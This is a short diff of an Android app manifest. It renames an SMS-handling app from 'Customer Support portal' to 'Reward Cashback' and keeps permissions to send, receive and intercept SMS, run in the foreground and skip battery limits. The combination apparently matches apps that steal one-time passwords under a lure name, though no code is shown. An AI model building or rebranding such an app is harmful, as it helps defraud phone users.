@@ -1,5 +1,5 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
-    package="com.example.sms_sender">
+    package="com.durto.reward">
     <uses-permission android:name="android.permission.INTERNET" /> 
     <uses-permission android:name="android.permission.SEND_SMS" />
     <uses-permission android:name="android.permission.RECEIVE_SMS"/>
@@ -7,7 +7,7 @@
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
     <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
    <application
-        android:label="Customer Support portal"
+        android:label="Reward Cashback"
         android:name="${applicationName}"
         android:icon="@mipmap/launcher_icon">
         <receiver android:name="com.shounakmulay.telephony.sms.IncomingSmsReceiver"
